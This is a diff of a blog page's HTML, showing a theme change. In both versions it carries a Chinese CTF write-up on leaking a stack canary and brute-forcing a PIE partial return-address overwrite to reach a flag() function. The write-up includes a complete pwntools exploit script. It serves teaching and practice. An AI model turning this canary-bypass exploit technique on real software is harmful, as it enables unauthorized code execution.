@@ -1,507 +1,888 @@
 <!DOCTYPE html>
-<html lang="en">
 
 
 
+  
 
 
+<html class="theme-next gemini use-motion" lang="en">
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" type="image/png" href="/img/favicon.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
   
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="">
-  <meta name="author" content="Paxos">
-  <meta name="keywords" content="">
-  <title>canary绕过与ROP.md - ScUpax0s</title>
-
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
 
   
-    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/dracula.min.css" />
+  
+  
   
 
   
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
 
 
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
 
 
 
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
+  <meta name="keywords" content="Canary && PIE," />
 
 
-  <script  src="/js/utils.js" ></script>
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ScUpax0s" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="0x01 考查知识点 Canary的泄露与绕过 开启PIE后地址的确定0x02 程序概览 我们先读了一个255到recvbuf，注意这里的recvbuf是一个bss段上的变量（未初始化全局），不是在栈上。然后从&amp;recvbuf拷贝256个字节到&amp;s，这里我们第一次的输入就被放到栈上了（因为s在栈上）。接下来使用write将s输出，这里可以用来泄露Canary。接下来他有读取了512">
+<meta property="og:type" content="article">
+<meta property="og:title" content="canary绕过与ROP.md">
+<meta property="og:url" content="http://yoursite.com/2020/05/13/canary%E7%BB%95%E8%BF%87%E4%B8%8EROP-md/index.html">
+<meta property="og:site_name" content="ScUpax0s">
+<meta property="og:description" content="0x01 考查知识点 Canary的泄露与绕过 开启PIE后地址的确定0x02 程序概览 我们先读了一个255到recvbuf，注意这里的recvbuf是一个bss段上的变量（未初始化全局），不是在栈上。然后从&amp;recvbuf拷贝256个字节到&amp;s，这里我们第一次的输入就被放到栈上了（因为s在栈上）。接下来使用write将s输出，这里可以用来泄露Canary。接下来他有读取了512">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/13/YUc7ut.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/13/YUglVK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/13/YU2dSJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/13/YUgY2d.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/13/YU2FsI.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/13/YURMtO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/13/YURrcj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/13/YUW0Vx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/13/YUfWpF.png">
+<meta property="article:published_time" content="2020-05-12T16:32:14.000Z">
+<meta property="article:modified_time" content="2020-05-12T18:30:10.741Z">
+<meta property="article:author" content="Paxos">
+<meta property="article:tag" content="Canary &amp;&amp; PIE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/05/13/YUc7ut.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/05/13/canary绕过与ROP-md/"/>
+
+
+
+
+
+  <title>canary绕过与ROP.md | ScUpax0s</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <meta name="generator" content="Hexo 4.2.0"></head>
 
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
 
-<body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+  
+  
+    
+  
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
 
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                Home
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                Archives
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                Categories
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                Tags
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                About
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
-          </li>
-        
-      </ul>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ScUpax0s</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
     </div>
-  </div>
-</nav>
-
-    <div class="view intro-2" id="background" parallax=true
-         style="background: url('/img/default.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="container text-center white-text fadeInUp">
-            <span class="h2" id="subtitle">
-              
-            </span>
-
-            
-              
-  <div class="mt-3 post-meta">
-    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2020-05-13 00:32">
-      May 13, 2020 am
-    </time>
+      
+        <p class="site-subtitle"></p>
+      
   </div>
 
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      1.6k 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      19
-       分钟
-    </span>
-  
-
-  
-  
-    
-      <!-- 不蒜子统计文章PV -->
-      <span id="busuanzi_container_page_pv" style="display: none">
-        <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="busuanzi_value_page_pv"></span> 次
-      </span>
-    
-  
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
 </div>
 
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
             
-          </div>
-
-          
-        </div>
-      </div>
-    </div>
-  </header>
-
-  <main>
-    
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
       
 
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="container nopadding-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <div class="post-content mx-auto" id="post">
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
             
-            <article class="markdown-body">
-              <h2 id="0x01-考查知识点"><a href="#0x01-考查知识点" class="headerlink" title="0x01 考查知识点"></a>0x01 考查知识点</h2><ul>
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/13/canary%E7%BB%95%E8%BF%87%E4%B8%8EROP-md/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Paxos">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/48941180?s=460&u=c99ae53e7dd15c30c6283cc36edb2f8825ce8aec&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ScUpax0s">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">canary绕过与ROP.md</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-13T00:32:14+08:00">
+                2020-05-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x01-考查知识点"><a href="#0x01-考查知识点" class="headerlink" title="0x01 考查知识点"></a>0x01 考查知识点</h2><ul>
 <li>Canary的泄露与绕过</li>
 <li>开启PIE后地址的确定<h2 id="0x02-程序概览"><a href="#0x02-程序概览" class="headerlink" title="0x02 程序概览"></a>0x02 程序概览</h2></li>
-<li>我们先读了一个255到recvbuf，注意这里的recvbuf是一个bss段上的变量（未初始化全局），不是在栈上。然后从&amp;recvbuf拷贝256个字节到&amp;s，这里我们第一次的输入就被放到栈上了（因为s在栈上）。接下来使用write将s输出，这里可以用来泄露Canary。接下来他有读取了512字节，<strong>注意，这里很重要，第一次读取了255；第二次读取了512</strong>，然后又将栈上内容输出。<img src="https://s1.ax1x.com/2020/05/13/YUc7ut.png" srcset="/img/loading.gif" alt=""></li>
+<li>我们先读了一个255到recvbuf，注意这里的recvbuf是一个bss段上的变量（未初始化全局），不是在栈上。然后从&amp;recvbuf拷贝256个字节到&amp;s，这里我们第一次的输入就被放到栈上了（因为s在栈上）。接下来使用write将s输出，这里可以用来泄露Canary。接下来他有读取了512字节，<strong>注意，这里很重要，第一次读取了255；第二次读取了512</strong>，然后又将栈上内容输出。<img src="https://s1.ax1x.com/2020/05/13/YUc7ut.png" alt=""></li>
 </ul>
 <ul>
-<li>看一下程序的保护,保护全开。<img src="https://s1.ax1x.com/2020/05/13/YUglVK.png" srcset="/img/loading.gif" alt="">)<img src="https://s1.ax1x.com/2020/05/13/YU2dSJ.png" srcset="/img/loading.gif" alt=""></li>
-<li>那这个程序其实利用点就很明显了，Got表不可写，地址随机化+Canary。。。万幸我们发现了程序中的<code>flag()</code>函数，这个函数可以直接pwn，所以目标就是ROP到<code>flag()</code>函数。<img src="https://s1.ax1x.com/2020/05/13/YUgY2d.png" srcset="/img/loading.gif" alt=""></li>
+<li>看一下程序的保护,保护全开。<img src="https://s1.ax1x.com/2020/05/13/YUglVK.png" alt="">)<img src="https://s1.ax1x.com/2020/05/13/YU2dSJ.png" alt=""></li>
+<li>那这个程序其实利用点就很明显了，Got表不可写，地址随机化+Canary。。。万幸我们发现了程序中的<code>flag()</code>函数，这个函数可以直接pwn，所以目标就是ROP到<code>flag()</code>函数。<img src="https://s1.ax1x.com/2020/05/13/YUgY2d.png" alt=""></li>
 </ul>
 <h2 id="0x03-攻击思路"><a href="#0x03-攻击思路" class="headerlink" title="0x03 攻击思路"></a>0x03 攻击思路</h2><ul>
 <li>首先，这是一个带Canary的程序，我们必须先拿到Canary，我们选择在第一个二write处泄漏Canary，此时的write输出时会将Canary的值带出来。</li>
 <li>当我们拿到Canary以后，进入第二个read，<code>padding + p64(Canary) + &#39;a&#39;*8 + flag_address</code>这就是我们的payload，实际就是把Canary拼进我们的payload，<strong>将栈上原本是Canary的地方覆盖为Canary</strong>（可能这句话有些奇怪，但是意思应该很好理解，就是保持Canary不变，防止触发stack smashing），接下来填充8字节垃圾值，到达返回地址，我们将放回地址覆盖为<code>flag()</code>函数的地址就好。</li>
-<li>在覆盖地址的时候，经过我的观察，我们的目标地址，与他原本的返回地址直接，<strong>只有最后两个字节不一样，所以由于PIE，我们只用爆破最后两个字节就可以了，其实只用爆破一个字节，pie最多影响到0x1000，这个爆破量很低</strong><img src="https://s1.ax1x.com/2020/05/13/YU2FsI.png" srcset="/img/loading.gif" alt="">)经过观察，原本返回地址的后三位0x2ff,我们目标返回的<code>flag()</code>后三位：0x185,所以最后一个字节我们直接拿<code>\x85</code>覆盖掉，倒数第二个字节我们爆破。</li>
+<li>在覆盖地址的时候，经过我的观察，我们的目标地址，与他原本的返回地址直接，<strong>只有最后两个字节不一样，所以由于PIE，我们只用爆破最后两个字节就可以了，其实只用爆破一个字节，pie最多影响到0x1000，这个爆破量很低</strong><img src="https://s1.ax1x.com/2020/05/13/YU2FsI.png" alt="">)经过观察，原本返回地址的后三位0x2ff,我们目标返回的<code>flag()</code>后三位：0x185,所以最后一个字节我们直接拿<code>\x85</code>覆盖掉，倒数第二个字节我们爆破。</li>
 </ul>
 <h2 id="0x04-攻击过程"><a href="#0x04-攻击过程" class="headerlink" title="0x04 攻击过程"></a>0x04 攻击过程</h2><ul>
-<li>首先我们把Canary泄漏出来。首先我们构造254个’a’然后sendline,这个时候write会把Cananry带出来，当然，被带出来的不只有Canary，还有一些我们不需要的值。不过这里有一个坑，在我们第一次read的时候，我们最多只能read进来255个字节的内容，这实际上跟Canary是有一个距离的，所以导致我们在接收返回时要丢掉这些垃圾值才接收到Canary<img src="https://s1.ax1x.com/2020/05/13/YURMtO.png" srcset="/img/loading.gif" alt="">  <figure class="highlight py"><table><tr><td class="gutter"><div class="hljs"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">254</span></span><br><span class="line">io.recvuntil(<span class="string">"say something~\n"</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">"You say: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="string">"""解释一下最后一行，由于我们接受了十个\x00。此时我们不仅接收到了8个垃圾\x00以及一个我们由于输入长度不够未填充到的\x00，还有一个Cananry的\x00也被我们接收过滤了，所以我们再接7个字节，这就是除了最低字节\x00以外的Canary的值，然后我们使用rjust给他填充到8字节，不足的\x00补全，此时就是完整的Cananry了"""</span></span><br></pre></div></td></tr></table></figure>
+<li>首先我们把Canary泄漏出来。首先我们构造254个’a’然后sendline,这个时候write会把Cananry带出来，当然，被带出来的不只有Canary，还有一些我们不需要的值。不过这里有一个坑，在我们第一次read的时候，我们最多只能read进来255个字节的内容，这实际上跟Canary是有一个距离的，所以导致我们在接收返回时要丢掉这些垃圾值才接收到Canary<img src="https://s1.ax1x.com/2020/05/13/YURMtO.png" alt="">  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">254</span></span><br><span class="line">io.recvuntil(<span class="string">"say something~\n"</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">"You say: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="string">"""解释一下最后一行，由于我们接受了十个\x00。此时我们不仅接收到了8个垃圾\x00以及一个我们由于输入长度不够未填充到的\x00，还有一个Cananry的\x00也被我们接收过滤了，所以我们再接7个字节，这就是除了最低字节\x00以外的Canary的值，然后我们使用rjust给他填充到8字节，不足的\x00补全，此时就是完整的Cananry了"""</span></span><br></pre></td></tr></table></figure>
   经过我们的调试我发现在把Canary泄露出来的同时，后面有18个字节的垃圾值也被泄漏出来的，所以我们再加一个<code>io.recv(18)</code>来过滤掉Canary后的18个字节垃圾值。以免影响后面的过程。</li>
-<li>在我们拿到Canary后，就可以拼入第二个read的payload里了，此时使用第二个read做溢出来覆盖返回地址，<strong>因为第二个read读进来512个字节，完全能够满足溢出的长度，不像第一个read覆盖不到。</strong>  <figure class="highlight py"><table><tr><td class="gutter"><div class="hljs"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs"><pre><span class="line">io.recv(<span class="number">18</span>)</span><br><span class="line">p2 = flat(<span class="string">'a'</span>*<span class="number">264</span>,p64(canary) ,<span class="string">"p"</span>*<span class="number">8</span>*<span class="number">1</span> , <span class="string">"\x85"</span> , <span class="string">"\xf1"</span>)   <span class="comment"># canary拼进去，此时就不会由于Cnanary被破坏导致stack smashing，'p'*8是为了覆盖在Canary和ret之间的s</span></span><br><span class="line">io.send(p2)</span><br></pre></div></td></tr></table></figure>
-  <img src="https://s1.ax1x.com/2020/05/13/YURrcj.png" srcset="/img/loading.gif" alt=""></li>
+<li>在我们拿到Canary后，就可以拼入第二个read的payload里了，此时使用第二个read做溢出来覆盖返回地址，<strong>因为第二个read读进来512个字节，完全能够满足溢出的长度，不像第一个read覆盖不到。</strong>  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.recv(<span class="number">18</span>)</span><br><span class="line">p2 = flat(<span class="string">'a'</span>*<span class="number">264</span>,p64(canary) ,<span class="string">"p"</span>*<span class="number">8</span>*<span class="number">1</span> , <span class="string">"\x85"</span> , <span class="string">"\xf1"</span>)   <span class="comment"># canary拼进去，此时就不会由于Cnanary被破坏导致stack smashing，'p'*8是为了覆盖在Canary和ret之间的s</span></span><br><span class="line">io.send(p2)</span><br></pre></td></tr></table></figure>
+  <img src="https://s1.ax1x.com/2020/05/13/YURrcj.png" alt=""></li>
 <li>接下来就是ret地址的问题了，因为我们只需要爆破一个字节（其实是半个字节），我们打一个while(1)循环直接爆就行，这块没什么技术含量。可以看到在p2中我们最后是这样写的<code>\x85 + \xf1</code>，这个85是确定的，而0xf1中f是被PIE随机化的，其实我们只需要爆这半个字节。</li>
 </ul>
-<h2 id="0x05-exp"><a href="#0x05-exp" class="headerlink" title="0x05 exp"></a>0x05 exp</h2><figure class="highlight py"><table><tr><td class="gutter"><div class="hljs"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs"><pre><span class="line"><span class="comment"># encoding='utf-8'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context.terminal=<span class="string">'/bin/zsh'</span></span><br><span class="line">elf = ELF(<span class="string">""</span>)</span><br><span class="line"><span class="comment">#io = process("./a.out")</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(<span class="string">""</span>)</span><br><span class="line">        payload = <span class="string">"a"</span>*<span class="number">254</span></span><br><span class="line">        io.recvuntil(<span class="string">"say something~\n"</span>)</span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        io.recvuntil(<span class="string">"You say: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span>)</span><br><span class="line">        canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">        log.info(hex(canary))</span><br><span class="line">        io.recv(<span class="number">18</span>)</span><br><span class="line">        p2 = flat(<span class="string">'a'</span>*<span class="number">264</span>,p64(canary) ,<span class="string">"p"</span>*<span class="number">8</span>*<span class="number">1</span> , <span class="string">"\x85"</span> , <span class="string">"\xf1"</span>)   <span class="comment"># canary</span></span><br><span class="line">        io.send(p2)</span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        io.recv()</span><br><span class="line">        io.sendline(<span class="string">"cat flag.txt"</span>)</span><br><span class="line">        io.recv()</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"error ret"</span></span><br></pre></div></td></tr></table></figure>
+<h2 id="0x05-exp"><a href="#0x05-exp" class="headerlink" title="0x05 exp"></a>0x05 exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding='utf-8'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context.terminal=<span class="string">'/bin/zsh'</span></span><br><span class="line">elf = ELF(<span class="string">""</span>)</span><br><span class="line"><span class="comment">#io = process("./a.out")</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(<span class="string">""</span>)</span><br><span class="line">        payload = <span class="string">"a"</span>*<span class="number">254</span></span><br><span class="line">        io.recvuntil(<span class="string">"say something~\n"</span>)</span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        io.recvuntil(<span class="string">"You say: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span>)</span><br><span class="line">        canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">        log.info(hex(canary))</span><br><span class="line">        io.recv(<span class="number">18</span>)</span><br><span class="line">        p2 = flat(<span class="string">'a'</span>*<span class="number">264</span>,p64(canary) ,<span class="string">"p"</span>*<span class="number">8</span>*<span class="number">1</span> , <span class="string">"\x85"</span> , <span class="string">"\xf1"</span>)   <span class="comment"># canary</span></span><br><span class="line">        io.send(p2)</span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        io.recv()</span><br><span class="line">        io.sendline(<span class="string">"cat flag.txt"</span>)</span><br><span class="line">        io.recv()</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"error ret"</span></span><br></pre></td></tr></table></figure>
 
